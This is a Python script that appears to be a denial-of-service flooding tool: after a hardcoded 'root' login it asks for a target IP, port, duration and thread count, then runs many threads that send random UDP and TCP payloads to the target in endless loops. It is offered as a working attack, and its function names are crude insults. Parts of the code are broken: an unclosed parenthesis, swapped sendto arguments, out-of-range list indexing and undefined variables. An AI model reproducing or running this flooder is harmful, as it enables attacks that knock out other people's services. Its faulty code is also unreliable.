import random,time,socket,threading,os,sys
username1 = "root"
password1 = "root"
username = str(input("\033[97mUsername:"))
password = str(input("\033[91mPassword:"))
if password == f"{password1}" and username == f"{username1}":
    print (f"Connect As {username}")
    time.sleep(2)

else:
    print (f"The password you entered is wrong Password You Input: {password}")
    exit()

os.system("clear")
print("""
[38;2;177;78;255m                       *   )  
[38;2;177;78;255m             (      )` )  /(  
[38;2;177;78;255m   _     _   )\  ( /( ( )(_)) 
[38;2;177;78;255m _| |_ _| |_((_) )\()|_(_())  
[38;2;177;78;255m|_   _|_   _| __((_)\|_   _|  
[38;2;177;78;255m  |_|   |_| | _|\ \ /  | |    
[38;2;177;78;255m            |___/_\_\  |_|    
""")
print("[38;2;177;78;255m@++ExT-Wizzly")

print("[38;2;177;78;255mIP HOST")
ip = str(input("[38;2;177;78;255m╚══> "))
print("[38;2;177;78;255mPORT HOST")
port = int(input("[38;2;177;78;255m╚══> "))
print("[38;2;177;78;255mDURATION INPUT")
times = int(input("[38;2;177;78;255m╚══> "))
print("[38;2;177;78;255mTHREADS INPUT")
threads = int(input("[38;2;177;78;255m╚══> "))

os.system("clear")
def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  randip5 = random.randint(1,255)
  randip6 = random.randint(1,255)
  randip7 = random.randint(1,255)
  randip8 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  randip.append(randip5)
  randip.append(randip6)
  randip.append(randip7)
  randip.append(randip8)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    addr[4] = str(random.randrange(2, 256))
    addr[5] = str(random.randrange(2, 254))
    addr[6] = str(random.randrange(2, 256))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
    return assemebled

def getproxy():
    global proxies
    f = open(f'{http}.txt','wb')
    r = requests.get(urlproxy)
    f.write(r.content)
    f.close()
    proxies = open(f'{http}.txt').readlines()

def proxyask():
    global urlproxy
    pro = input(f'[~] Get New List {nprox} [Y] : ')
    if pro == "Y":
        urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
        urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
        getproxy()
        askthreads()
    else:
        proxyask()
def ajimat():
  data = random._urandom(839)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
def gho():
  data = random._urandom(783)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
def anakbajingan():
  data = random._urandom(600)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
def anaktolol():
  data = random._urandom(577)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
def anakasu():
  data = random._urandom(577)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
def ext1():
  data = random._urandom(616)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext2():
  data = random._urandom(616)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
def ext3():
  data = random._urandom(616)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
def ext4():
  data = random._urandom(616)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext5():
  data = random._urandom(616)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext6():
  data = random._urandom(616)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext7():
  data = random._urandom(616)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext8():
  data = random._urandom(616)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext9():
  data = random._urandom(616)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def ext10():
  data = random._urandom(616)
  bapaklu = os.urandom(min(818,616,577,1025,1024, threads)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        s.sendto(bapaklu,addr)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def kntl():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      s.close()
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

def memek():
  data = random._urandom(616)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      s.close()
      print(f"[38;2;177;78;255m Exaults Attacked Ip Port \033[30;1m{ip}:{port}")

for y in range(threads):
  if choice == "y":
    th = threading.Thread(target = ext1)
    th.start()
    th = threading.Thread(target = ext2)
    th.start()
    th = threading.Thread(target = ext3)
    th.start()
    th = threading.Thread(target = ext4)
    th.start()
    th = threading.Thread(target = ext5)
    th.start()
    th = threading.Thread(target = ext6)
    th.start()
    th = threading.Thread(target = ext7)
    th.start()
    th = threading.Thread(target = ext8)
    th.start()
    th = threading.Thread(target = ext9)
    th.start()
    th = threading.Thread(target = ext10)
    th.start()
    th = threading.Thread(target = anakasu)
    th.start()
    th = threading.Thread(target = anaktolol)
    th.start()
    th = threading.Thread(target = anakbajingan)
    th.start()
    th = threading.Thread(target = gho)
    th.start()
    th = threading.Thread(target = ajimat)
    th.start()
  else:
    th = threading.Thread(target = kntl)
    th.start()
    th = threading.Thread(target = memek)
    th.start()